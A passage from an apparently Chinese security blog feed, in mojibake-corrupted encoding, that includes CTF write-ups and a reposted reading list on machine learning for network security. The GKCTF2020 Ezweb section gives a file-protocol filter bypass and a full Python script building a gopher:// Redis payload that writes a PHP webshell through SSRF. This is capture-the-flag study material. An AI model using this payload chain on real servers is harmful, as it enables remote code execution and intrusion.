<li>ä¸ºäº†ä¿è¯Exec()å‡½æ•°ä¸­scanéƒ¨åˆ†å’Œreadéƒ¨åˆ†éƒ½èƒ½è¢«æ‰§è¡Œï¼Œ<code>self.action</code>å¿…é¡»æœ‰<code>readscan</code>æˆ–<code>scanread</code>è¿™æ ·çš„å­—ç¬¦ä¸²ï¼ˆæ³¨æ„ï¼šæºç ä¸­ç”¨<code>in</code>æ“ä½œç¬¦è€Œä¸æ˜¯ç”¨<code>==</code>ï¼‰ã€‚</li>
<li>ç­‰å·å³è¾¹æ˜¯<code>md5(key + param + 'scan')</code>ï¼Œæ‰€ä»¥å¯ä»¥å°†ç­‰å·å·¦è¾¹çš„<code>self.action</code>å®šä¸º<code>readscan</code>ã€‚</li>
<li>è¿™æ ·ä¸€æ¥ï¼Œç­‰å·å·¦è¾¹ä¸º<code>md5(key + 'flag.txt' + 'readscan')</code>ï¼Œç°åœ¨å°±å‰©ä¸‹ç­‰å·å³è¾¹çš„<code>param</code>å‚æ•°æ²¡æœ‰ç¡®å®šï¼Œé‚£ä¹ˆä¸ºäº†éªŒè¯é€šè¿‡ï¼Œæˆ‘ä»¬å¯ä»¥å°†<code>param=flag.txtread</code>ä¼ å‚ã€‚</li>
<li>æœ€åä¹Ÿå°±ç­‰ä»·äº<code>md5(key + 'flag.txt' + 'readscan') == md5(key + 'flag.txtread' + 'scan') </code></li>
</ol>
<p>payload1</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230158.png" alt=""></p>
<p>payload2</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200620230222.png" alt=""></p>
<h2 id="GKCTF2020-Ezweb">GKCTF2020 Ezweb</h2>
<p>æ‰“å¼€é¢˜ç›®æŸ¥çœ‹æºä»£ç </p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220548.png" alt=""></p>
<p>æ·»åŠ ä¸€ä¸‹<code>?secret</code>å‚æ•°ï¼Œè¿”å›äº†<code>ifconfig</code>å‘½ä»¤çš„ç»“æœ</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220700.png" alt=""></p>
<p>åº”è¯¥æ˜¯SSRFæ¼æ´åˆ©ç”¨äº†ï¼Œå…ˆå°è¯•ç”¨fileåè®®è¯»æ–‡ä»¶ï¼Œå‘ç°è¢«banæ‰äº†ï¼Œç”¨<code>file:/</code>æˆ–è€…<code>file: ///</code>ç»•è¿‡ï¼š</p>
<p>payloadï¼š<code>file: ///var/www/html/index.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711220855.png" alt=""></p>
<p>å®¡è®¡ä¸€ä¸‹ä»£ç </p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">curl</span>(<span class="params">$url</span>)</span>&#123;  </span><br><span class="line">    $ch = curl_init();</span><br><span class="line">    curl_setopt($ch, CURLOPT_URL, $url);</span><br><span class="line">    curl_setopt($ch, CURLOPT_HEADER, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">echo</span> curl_exec($ch);</span><br><span class="line">    curl_close($ch);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;submit&#x27;</span>]))&#123;</span><br><span class="line">		$url = $_GET[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line">		<span class="comment">//echo $url.&quot;\n&quot;;</span></span><br><span class="line">		<span class="keyword">if</span>(preg_match(<span class="string">&#x27;/file\:\/\/|dict|\.\.\/|127.0.0.1|localhost/is&#x27;</span>, $url,$match))</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="comment">//var_dump($match);</span></span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&#x27;åˆ«è¿™æ ·&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		curl($url);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;secret&#x27;</span>]))&#123;</span><br><span class="line">	system(<span class="string">&#x27;ifconfig&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>ä»æºç ä¸­å¯çŸ¥è¿‡æ»¤äº†fileåè®®ã€dictåè®®ã€127.0.0.1å’Œlocalhostï¼Œä½†æ²¡æœ‰è¿‡æ»¤httpåè®®å’Œgopheråè®®ã€‚</p>
<p>æ—¢ç„¶ç»™äº†å†…ç½‘åœ°å€ï¼Œé‚£ä¹ˆå…ˆhttpåè®®æ¢æµ‹ä¸€ä¸‹å†…ç½‘ä¸»æœºå­˜æ´»ï¼Œç›´æ¥ä¸Šå·¥å…·Fuzzï¼š</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225350.png" alt=""></p>
<p>11ç«¯å£çš„å›æ˜¾ç»™äº†ä¸€ä¸ªhint</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711225429.png" alt=""></p>
<p>æ¥ç€ç”¨httpåè®®å»Fuzzè¿™ä¸ªä¸»æœºçš„ç«¯å£</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711234135.png" alt=""></p>
<p>å‘ç°äº†è¿è¡Œç€RedisæœåŠ¡ï¼Œç›´æ¥ç”¨ä¸‹é¢è¿™ä¸ª<a href="https://www.redteaming.top/2019/07/15/%E6%B5%85%E6%9E%90Redis%E4%B8%ADSSRF%E7%9A%84%E5%88%A9%E7%94%A8/#Redis4-x-5-x%E4%BB%8ESSRF%E5%88%B0RCE">è„šæœ¬</a>ç”Ÿæˆpayloadï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib</span><br><span class="line">protocol=<span class="string">&quot;gopher://&quot;</span></span><br><span class="line">ip=<span class="string">&quot;173.10.238.11&quot;</span>      // è¿è¡Œæœ‰redisçš„ä¸»æœºip</span><br><span class="line">port=<span class="string">&quot;6379&quot;</span></span><br><span class="line">shell=<span class="string">&quot;\n\n&lt;?php system(\&quot;cat /flag\&quot;);?&gt;\n\n&quot;</span></span><br><span class="line">filename=<span class="string">&quot;shell.php&quot;</span></span><br><span class="line">path=<span class="string">&quot;/var/www/html&quot;</span></span><br><span class="line">passwd=<span class="string">&quot;&quot;</span></span><br><span class="line">cmd=[<span class="string">&quot;flushall&quot;</span>,</span><br><span class="line">	 <span class="string">&quot;set 1 &#123;&#125;&quot;</span>.format(shell.replace(<span class="string">&quot; &quot;</span>,<span class="string">&quot;$&#123;IFS&#125;&quot;</span>)),</span><br><span class="line">	 <span class="string">&quot;config set dir &#123;&#125;&quot;</span>.format(path),</span><br><span class="line">	 <span class="string">&quot;config set dbfilename &#123;&#125;&quot;</span>.format(filename),</span><br><span class="line">	 <span class="string">&quot;save&quot;</span></span><br><span class="line">	 ]</span><br><span class="line"><span class="keyword">if</span> passwd:</span><br><span class="line">	cmd.insert(<span class="number">0</span>,<span class="string">&quot;AUTH &#123;&#125;&quot;</span>.format(passwd))</span><br><span class="line">payload=protocol+ip+<span class="string">&quot;:&quot;</span>+port+<span class="string">&quot;/_&quot;</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">redis_format</span>(<span class="params">arr</span>):</span></span><br><span class="line">	CRLF=<span class="string">&quot;\r\n&quot;</span></span><br><span class="line">	redis_arr = arr.split(<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd=<span class="string">&quot;&quot;</span></span><br><span class="line">	cmd+=<span class="string">&quot;*&quot;</span>+str(len(redis_arr))</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> redis_arr:</span><br><span class="line">		cmd+=CRLF+<span class="string">&quot;$&quot;</span>+str(len((x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>))))+CRLF+x.replace(<span class="string">&quot;$&#123;IFS&#125;&quot;</span>,<span class="string">&quot; &quot;</span>)</span><br><span class="line">	cmd+=CRLF</span><br><span class="line">	<span class="keyword">return</span> cmd</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">	<span class="keyword">for</span> x <span class="keyword">in</span> cmd:</span><br><span class="line">		payload += urllib.quote(redis_format(x))</span><br><span class="line">	<span class="keyword">print</span> payload</span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235713.png" alt=""></p>
<p>ç”ŸæˆPayloadåç›´æ¥æ”¾åœ¨è¾“å…¥æ¡†ä¸­æ‰“è¿‡å»ï¼Œå†è¾“å…¥<code>http://173.10.238.11/shell.php</code></p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20200711235812.png" alt=""></p>
<h2 id="HITCON-2017-SSRFme">HITCON 2017 SSRFme</h2>
<h3 id="TODO">TODO</h3>
<h2 id="ç½‘é¼æ¯-2018-Fakebook">ç½‘é¼æ¯ 2018 Fakebook</h2>
<h3 id="TODO-v2">TODO</h3>
<h2 id="ç½‘é¼æ¯-2020-ç„æ­¦ç»„-SSRFMe">ç½‘é¼æ¯ 2020 ç„æ­¦ç»„ SSRFMe</h2>
<h3 id="TODO-v3">TODO</h3>
]]></content>
      <categories>
        <category>CTF</category>
        <category>SSRF</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰</title>
    <url>/Machine_learning/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0%E4%B8%8E%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E7%9B%B8%E5%85%B3%E7%9A%84%E8%B5%84%E6%96%99%EF%BC%88%E8%BD%AC%EF%BC%89/</url>
    <content><![CDATA[<h1 id="æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰">æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™ï¼ˆè½¬ï¼‰</h1>
<p>å¤–åª’ KDnuggets åˆŠç™»äº†ä¸€ç¯‡æœºå™¨å­¦ä¹ ä¸ç½‘ç»œå®‰å…¨ç›¸å…³çš„èµ„æ–™å¤§æ±‡æ€»ï¼Œæ–‡ä¸­åˆ—å‡ºäº†ç›¸å…³æ•°æ®æºçš„è·å–é€”å¾„ï¼Œä¼˜ç§€çš„è®ºæ–‡å’Œä¹¦ç±ï¼Œä»¥åŠä¸°å¯Œçš„æ•™ç¨‹ã€‚å¤§éƒ¨åˆ†éƒ½æ˜¯ä½œè€…åœ¨æ—¥å¸¸å·¥ä½œå’Œå­¦ä¹ ä¸­äº²è‡ªä½¿ç”¨å¹¶è®¤ä¸ºå€¼å¾—å®‰åˆ©çš„çº¯å¹²è´§ã€‚</p>
<h2 id="æ•°æ®æº">æ•°æ®æº</h2>
<p><a href="http://www.secrepo.com/">SecRepo.com</a> ç½‘ç«™ï¼Œè¯¥ç½‘ç«™æ±‡èšäº†å¤§é‡çš„ä¸æœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨ç›¸å…³çš„æ•°æ®æºï¼Œå¹¶æä¾›å…è´¹ä¸‹è½½ã€‚æ®ç½‘ç«™é¦–é¡µä»‹ç»ï¼Œæ‰€æœ‰å¯ç”¨çš„æ•°æ®æºåŒ…å«ä¸¤ä¸ªéƒ¨åˆ†ï¼šä¸€æ˜¯ç½‘ç«™æ–¹é¢è‡ªå·±æ•´ç†çš„ï¼ŒäºŒæ˜¯æ¥è‡ªç¬¬ä¸‰æ–¹çš„ã€‚å…¶å†…å®¹åŒ…æ‹¬äº’è”ç½‘æ‰«ææ•°æ®ï¼Œæ¶æ„è½¯ä»¶æºç ï¼Œä»¥åŠå’Œç½‘ç»œå®‰å…¨ç›¸å…³çš„ç³»ç»Ÿæ—¥å¿—ç­‰ã€‚</p>
<h2 id="è®ºæ–‡">è®ºæ–‡</h2>
<p><a href="https://www.usenix.org/conference/usenixsecurity16/technical-sessions/presentation/melicher"><strong>1. Fast, Lean, and Accurate: Modeling Password Guessability Using Neural Networks</strong></a></p>
<p>æœ¬æ–‡æ¥è‡ªå¡å†…åŸºæ¢…éš†å¤§å­¦ï¼Œåˆ†æäº†é€šç”¨ç¬¦å·å¯†ç çš„è„†å¼±æ€§ï¼Œä»¥åŠç›®å‰å¸¸è§çš„å¯†ç å¥å£®æ€§æ£€éªŒçš„å„ç§ç¼ºç‚¹ï¼Œç”šè‡³ç»™å‡ºäº†ä»–ä»¬åœ¨å®éªŒå®¤åˆ©ç”¨ç¥ç»ç½‘ç»œç®—æ³•æ”»ç ´å„ç§ç¬¦å·å¯†ç çš„å…·ä½“æ­¥éª¤ï¼Œéå¸¸å¼ºå¤§ã€‚</p>
<p><a href="http://ieeexplore.ieee.org/document/5504793/"><strong>2. Outside the Closed World: On Using Machine Learning for Network Intrusion Detection</strong></a></p>
<p>æœ¬æ–‡æ¥è‡ªåŠ å·ä¼¯å…‹åˆ©å¤§å­¦ï¼Œåˆ†æäº†åˆ©ç”¨æœºå™¨å­¦ä¹ æ¢æµ‹ç½‘ç»œå®‰å…¨çš„ä¼˜åŠ¿å’ŒåŠ£åŠ¿ï¼Œå¹¶ç»™å‡ºäº†ä¸€äº›æ”¹å–„è¿™äº›åŠ£åŠ¿çš„è§£å†³æ–¹æ¡ˆã€‚</p>
<p><a href="https://link.springer.com/chapter/10.1007/978-3-540-30143-1_11"><strong>3. Anomalous Payload-Based Network Intrusion Detection</strong></a></p>
<p>é€šå¸¸ä¸€ä¸ªäº’è”ç½‘ä¸Šçš„æ¶æ„è¯·æ±‚éƒ½ä¼šåœ¨çœŸæ­£çš„æ¶æ„ä»£ç å¤–éƒ¨åŒ…è£…ä¸€å±‚å–„æ„çš„å¤–è¡£ï¼Œè¿™å¤§å¤§é˜»ç¢äº†ç›¸å…³æ¢æµ‹ç¨‹åºçš„æ­£å¸¸å·¥ä½œã€‚æ¥è‡ªå“¥ä¼¦æ¯”äºšå¤§å­¦çš„Ke Wangå’ŒSalvatore J. Stolfoä¸¤ä½å­¦è€…åœ¨æœ¬æ–‡ä¸­ç»™å‡ºäº†ä¸€ç§å…¨æ–°çš„æ¢æµ‹æ¶æ„ä»£ç ä¸­æœ‰æ•ˆä»£ç æ®µçš„æ–¹æ³•ï¼Œå¹¶åœ¨å®æµ‹ä¸­è¾¾åˆ°äº†æ¥è¿‘100%æ­£ç¡®ç‡å’Œ0.1%çš„è¯¯æŠ¥ç‡ã€‚</p>
<p><a href="https://dl.acm.org/citation.cfm?id=2420987"><strong>4. Malicious PDF detection using metadata and structural features</strong></a></p>
<p>å½“å‰ï¼Œéšç€é˜²èŒƒæªæ–½çš„å‡çº§ï¼Œæ¶æ„ä»£ç éšè—åœ¨PDFå’ŒWordç­‰æ–‡æœ¬æ–‡ä»¶ä¸­çš„ä¾‹å­å±¡è§ä¸é²œï¼Œç”¨æˆ·é˜²ä¸èƒœé˜²ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œæ¥è‡ªä¹”æ²»æ¢…æ£®å¤§å­¦çš„å­¦è€…ä»‹ç»äº†ä¸€ç§é€šè¿‡æœºå™¨å­¦ä¹ æŠ€æœ¯æ¢æµ‹æ¶æ„æ–‡æœ¬æ–‡ä»¶çš„æŠ€æœ¯ï¼Œç‰¹åˆ«æ˜¯å†…å«æ¶æ„ä»£ç çš„PDFæ–‡ä»¶ã€‚</p>
<p><a href="https://dl.acm.org/citation.cfm?id=2339697"><strong>5. Adversarial support vector machine learning</strong></a></p>
<p>æ¥è‡ªå¾·å·å¤§å­¦ï¼Œä»‹ç»äº†ä¸¤ç§åˆ©ç”¨æœºå™¨å­¦ä¹ æŠ€æœ¯æ¢æµ‹ç½‘ç»œæ¶æ„æ”»å‡»çš„åˆ†ææ¨¡å‹ï¼Œå³æ— è¾¹ç•Œæ”»å‡»æ¨¡å‹ï¼ˆfree-range attack modelï¼‰å’Œé™åˆ¶è¾¹ç•Œæ”»å‡»æ¨¡å‹ï¼ˆrestrained attack modelï¼‰ã€‚</p>
<p><a href="https://dl.acm.org/citation.cfm?id=1387709.1387716"><strong>6. Exploiting machine learning to subvert your spam filter</strong></a></p>
<p>åƒåœ¾é‚®ä»¶è¿‡æ»¤ç³»ç»Ÿä¸ç®—ä»€ä¹ˆé«˜æ–°æŠ€æœ¯ï¼Œä½†å¦‚ä½•æå‡è¿‡æ»¤çš„å‡†ç¡®æ€§ä¸€ç›´æ˜¯ä¸€ä¸ªéš¾é¢˜ã€‚æœ¬æ–‡ä¸­æ¥è‡ªåŠ å·ä¼¯å…‹åˆ©å¤§å­¦çš„å­¦è€…ä»¬ä»‹ç»äº†ä¸€ç§åŸºäºæœºå™¨å­¦ä¹ å¼€å‘çš„åƒåœ¾é‚®ä»¶è¿‡æ»¤å™¨ï¼Œä¸ºåƒåœ¾é‚®ä»¶çš„è¿‡æ»¤æä¾›äº†ä¸€ç§å…¨æ–°çš„å®ç°æ€è·¯ã€‚</p>
<p>ä»¥ä¸‹è®ºæ–‡æ¥è‡ª <a href="http://covert.io/">covert.io</a> ç½‘ç«™ï¼Œè¯¥ç½‘ç«™çš„è®ºæ–‡ï¼ˆæˆ–åšå®¢ï¼‰æ•°é‡åºå¤§ï¼Œä½†å¹¶ä¸åƒä¸Šæ–‡æåˆ°çš„é‚£äº›è®ºæ–‡ä¸€æ ·å…¨éƒ¨æ¥è‡ªç¾å›½é«˜æ ¡ï¼Œ<a href="http://covert.io">covert.io</a> çš„æ–‡ç« ä¹Ÿæ¥è‡ªå„å¤§ç§‘æŠ€å…¬å¸å’Œç ”ç©¶æ‰€ã€‚</p>
<p>[<strong>7. CAMP: Content-Agnostic Malware Protection</strong>](<a href="http://www.covert.io/research-papers/security/CAMP">http://www.covert.io/research-papers/security/CAMP</a> - Content Agnostic Malware Protection.pdf)</p>
<p>æ¥è‡ªè°·æ­Œï¼Œä»‹ç»äº†ä¸€ç§åä¸ºCAMPçš„æ¶æ„è½¯ä»¶ä¿æŠ¤ç³»ç»Ÿï¼Œè¯¥ç³»ç»Ÿèƒ½å¤Ÿé€šè¿‡å¯¹äºŒè¿›åˆ¶å¯æ‰§è¡Œæ–‡ä»¶çš„æ¢æµ‹ï¼Œç¡®ä¿äº’è”ç½‘çš„è½¯ä»¶åº”ç”¨å®‰å…¨ã€‚</p>
<p><strong>[8. Building a Dynamic Reputation System for DNS](<a href="http://www.covert.io/research-papers/security/Notos">http://www.covert.io/research-papers/security/Notos</a> - Building a dynamic reputation system for dns.pdf)</strong></p>
<p>DNSæœåŠ¡å™¨ä¸€ç›´æ˜¯äº’è”ç½‘ä¸­éå¸¸é‡è¦çš„ç»„æˆéƒ¨åˆ†ï¼Œé’ˆå¯¹ç›®å‰è¶Šæ¥è¶Šæµè¡Œçš„DNSæ”»å‡»ï¼Œæ¥è‡ªä¹”æ²»äºšç†å·¥å­¦é™¢çš„å­¦è€…ä»‹ç»äº†ä¸€ç§åä¸ºNotosçš„åŠ¨æ€çš„åŸŸåä¿¡èª‰ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆé˜²èŒƒå„ç§é’ˆå¯¹DNSæœåŠ¡å™¨çš„åŒ¿åçš„ç½‘ç»œé»‘å®¢æ”»å‡»ã€‚</p>
<p>[<strong>9. Detecting malware domains at the upper dns hierarchy</strong>](<a href="http://www.covert.io/research-papers/security/Kopis">http://www.covert.io/research-papers/security/Kopis</a> - Detecting malware domains at the upper dns hierarchy.pdf)</p>
<p>æœ¬æ–‡ä»‹ç»äº†ä¸€ç§åä¸ºKopisçš„æ–°å‹åŸŸåæ£€æµ‹ç³»ç»Ÿï¼Œå¯ä»¥æœ‰æ•ˆæ¢æµ‹äº’è”ç½‘ä¸ŠåŒ…å«æ¶æ„æ”»å‡»ä»£ç çš„åŸŸåï¼Œç”±ç½‘ç»œå®‰å…¨å…¬å¸Damballaã€ä¹”æ²»äºšç†å·¥å­¦é™¢å’Œä¹”æ²»äºšå¤§å­¦è”åˆç ”å‘ã€‚</p>
<p>[<strong>10. From Throw-away Traffic To Bots â€“ Detecting The Rise Of DGA-based Malware</strong>](<a href="http://www.covert.io/research-papers/security/From">http://www.covert.io/research-papers/security/From</a> throw-away traffic to bots - detecting the rise of dga-based malware.pdf)</p>
<p>æœ¬æ–‡åŒæ ·æ¥è‡ªDamballaå…¬å¸å’Œä¹”æ²»äºšå¤§å­¦ï¼Œä»‹ç»äº†ä¸€ç§é’ˆå¯¹åƒµå°¸ç½‘ç»œçš„æ–°æŠ€æœ¯ï¼Œè¯¥æŠ€æœ¯å¤Ÿæ¢æµ‹æ¥è‡ªåŠ¨æ€åŸŸåç³»ç»Ÿçš„æ¶æ„æ”»å‡»ï¼Œæ•´åˆäº†èšåˆå’Œåˆ†ç±»ä¸¤ç±»ç®—æ³•ã€‚</p>
<p><strong>[11. EXPOSURE: Finding Malicious Domains Using Passive DNS Analysis](<a href="http://www.covert.io/research-papers/security/Exposure">http://www.covert.io/research-papers/security/Exposure</a> - Finding malicious domains using passive dns analysis.pdf)</strong></p>
<p>DNSæœåŠ¡å™¨æˆä¸ºäº†è¶Šæ¥è¶Šå¤šé»‘å®¢çš„æ”»å‡»å¯¹è±¡ï¼Œæœ¬æ–‡ä»‹ç»äº†ä¸€ç§åä¸ºEXPOSUREçš„åŸŸååˆ†æç³»ç»Ÿï¼Œå¯ä»¥é’ˆå¯¹å¤§æ‰¹é‡çš„åŸŸåæ¶æ„è®¿é—®è¿›è¡Œæ¢æµ‹ï¼Œç”±Eurecomç ”ç©¶æ‰€ã€æ³¢å£«é¡¿ä¸œåŒ—å¤§å­¦å’ŒåŠ å·å¤§å­¦å…±åŒç ”å‘ã€‚</p>
<p>[<strong>12. Polonium: Tera-Scale Graph Mining for Malware Detection</strong>](<a href="http://www.covert.io/research-papers/security/Polonium">http://www.covert.io/research-papers/security/Polonium</a> - Tera-Scale Graph Mining for Malware Detection.pdf)</p>
<p>æœ¬æ–‡æ¥è‡ªç½‘ç»œå®‰å…¨å…¬å¸Symantecã€å¡å†…åŸºæ¢…éš†å¤§å­¦ï¼Œä»‹ç»äº†ä¸€ä¸ªåä¸ºPoloniumçš„é«˜æ•ˆçš„å¯æ‰©å±•çš„æ¶æ„è½¯ä»¶æ¢æµ‹ç³»ç»Ÿã€‚</p>
<p>[<strong>13. Nazca: Detecting Malware Distribution in Large-Scale Networks</strong>](<a href="http://www.covert.io/research-papers/security/Nazca">http://www.covert.io/research-papers/security/Nazca</a> -  Detecting Malware Distribution in Large-Scale Networks.pdf)</p>
<p>å¤§é‡ç”¨æˆ·åœ¨ç°å®ç”Ÿæ´»ä¸­ä¸‹è½½å¹¶å®‰è£…æ¶æ„è½¯ä»¶çš„è¡Œä¸ºé€šå¸¸åŒ…å«ä¸€å®šçš„è§„å¾‹æ€§ã€‚æ¥è‡ªåŠ å·å¤§å­¦åœ£å·´å·´æ‹‰åˆ†æ ¡ã€Naruså…¬å¸çš„å­¦è€…ä»¬å°†è¿™äº›æ— äººé—®æ´¥çš„æ•°æ®åˆ©ç”¨èµ·æ¥ï¼Œæå‡ºäº†ä¸€ä¸ªåä¸ºNazcaçš„ç½‘ç»œå®‰å…¨æ¢æµ‹ç³»ç»Ÿã€‚</p>
<p>[<strong>14. Anagram: A Content Anomaly Detector Resistant to Mimicry Attack</strong>](<a href="http://www.covert.io/research-papers/security/Anagram">http://www.covert.io/research-papers/security/Anagram</a> - A Content Anomaly Detector Resistant to Mimicry Attack.pdf)</p>
<p>æ¥è‡ªå“¥ä¼¦æ¯”äºšå¤§å­¦ï¼Œä»‹ç»äº†ä¸€ä¸ªåä¸ºAnagramçš„å¼‚å¸¸æ•°æ®æŠ¥æ–‡æ¢æµ‹å™¨ã€‚</p>
<h2 id="ä¹¦ç±">ä¹¦ç±</h2>
<p>è®²è¿°æ•°æ®ç§‘å­¦å’Œæœºå™¨å­¦ä¹ åœ¨ç½‘ç»œå®‰å…¨é¢†åŸŸçš„åº”ç”¨çš„ä¹¦ç±å¹¶ä¸å¤šï¼Œä½œè€…åªä»‹ç»äº†ä»¥ä¸‹ä¸¤æœ¬ã€‚</p>
<p><strong><a href="https://www.amazon.cn/Data-Mining-and-Machine-Learning-in-Cybersecurity-Dua-Sumeet/dp/B00BU1CDFI/ref=sr_1_1?s=books&amp;ie=UTF8&amp;qid=1483425388&amp;sr=1-1&amp;keywords=Data+Mining+and+Machine+Learning+in+Cybersecurity">1. Data Mining and Machine Learning in Cybersecurity</a></strong></p>
<p>ä½œè€…æ˜¯æ¥è‡ªè·¯æ˜“æ–¯å®‰é‚£ç†å·¥å¤§å­¦çš„Sumeet Duaåšå£«å’ŒXian Duåšå£«ï¼Œæ¢è®¨äº†ç›®å‰æ™®éå­˜åœ¨çš„ç½‘ç»œå®‰å…¨é—®é¢˜ä»¥åŠæœ€å…ˆè¿›çš„æœºå™¨å­¦ä¹ å’Œæ•°æ®æŒ–æ˜è§£å†³æ–¹æ¡ˆã€‚</p>
<p><a href="https://www.amazon.cn/Machine-Learning-and-Data-Mining-for-Computer-Security-Methods-and-Applications/dp/184628029X"><strong>2. Machine Learning and Data Mining for Computer Security</strong></a></p>
<p>ç¼–è€…æ˜¯æ¥è‡ªä¹”æ²»åŸå¤§å­¦çš„Marcus A. Maloofï¼Œè¯¥ä¹¦ç³»ç»Ÿä»‹ç»äº†æ•°æ®æŒ–æ˜å’Œæœºå™¨å­¦ä¹ æŠ€æœ¯åœ¨è®¡ç®—æœºå®‰å…¨é¢†åŸŸçš„æœ€æ–°ç ”ç©¶æˆæœã€‚</p>
<p><em>ç›®å‰ä¸¤æœ¬ä¹¦éƒ½æ²¡æœ‰ä¸­æ–‡ç‰ˆï¼Œçº¸è´¨ç‰ˆåœ¨äºšé©¬é€Šä¸Šçš„å”®ä»·éƒ½è¶…è¿‡1000äººæ°‘å¸ï¼Œç¬¬ä¸€æœ¬æœ‰Kindleç”µå­ç‰ˆã€‚</em></p>
<h2 id="æ¼”è®²">æ¼”è®²</h2>
<p>åŸæ–‡ä½œè€…æ”¶é›†äº†å¦‚ä¸‹ä¸€äº›å…³äºæœºå™¨å­¦ä¹ å’Œç½‘ç»œå®‰å…¨çš„æ¼”è®²ï¼Œæ¼”è®²è€…ä»¬è¦ä¹ˆæ˜¯æ¥è‡ªç›¸å…³é¢†åŸŸçš„å…¬å¸å‰¯æ€»ã€æŠ€æœ¯è´Ÿè´£äººï¼Œè¦ä¹ˆæ˜¯å„å¤§é«˜æ ¡çš„ç ”ç©¶äººå‘˜ã€åšå£«æˆ–è€…æ•™æˆã€‚</p>
<p><a href="https://www.youtube.com/watch?v=tukidI5vuBs"><strong>1. Using Machine Learning to Support Information Security</strong></a></p>
<p>è§†é¢‘ç³»ç»Ÿä»‹ç»äº†æœºå™¨å­¦ä¹ åœ¨ä¿¡æ¯å®‰å…¨é¢†åŸŸçš„åº”ç”¨ï¼Œæ—¶é•¿çº¦1å°æ—¶ã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=36IT9VgGr0g">2. Defending Networks with Incomplete Information</a></strong></p>
<p>è¦åœ¨é™å®šçš„æ—¶é—´å†…ï¼ˆé€šå¸¸æ˜¯24å°æ—¶ï¼‰å¯¹æ¶æ„æ”»å‡»åšå‡ºååº”é€šå¸¸éœ€è¦è€—è´¹å·¨å¤§çš„äººåŠ›å’Œç‰©åŠ›ï¼Œä½†æ˜¯å¦‚æœåˆ©ç”¨æœºå™¨å­¦ä¹ çš„æ–¹æ³•ï¼Œé¦–å…ˆå¯¹ç½‘ç»œæ”»å‡»è¿›è¡Œä¼˜å…ˆçº§å’Œæ”»å‡»æ–¹å¼åˆ†ç±»ï¼Œç”šè‡³å¤„ç†ä¸€äº›ç®€å•çš„å¥—è·¯å¼çš„æ”»å‡»ï¼Œåˆ™å¯ä»¥å¤§å¤§é™ä½ç½‘ç»œå®‰å…¨å·¥ç¨‹å¸ˆçš„å·¥ä½œå¼ºåº¦ã€‚æœ¬è§†é¢‘å°±ä»‹ç»äº†è¿™ä¸€æ€è·¯çš„å…·ä½“åº”ç”¨ï¼Œæ—¶é•¿çº¦47åˆ†é’Ÿã€‚</p>
<p><a href="https://www.youtube.com/watch?v=vy-jpFpm1AU"><strong>3. Applying Machine Learning to Network Security Monitoring</strong></a></p>
<p>è¿™ä¸ªè§†é¢‘ä»‹ç»äº†å¦‚ä½•å°†æœºå™¨å­¦ä¹ åº”ç”¨äºç½‘ç»œå®‰å…¨æ¢æµ‹ï¼Œæ—¶é•¿çº¦1å°æ—¶ã€‚</p>
<p><strong><a href="https://www.youtube.com/watch?v=yG6QlHOAWiE">4. Measuring the IQ of your Threat Intelligence Feed</a></strong></p>
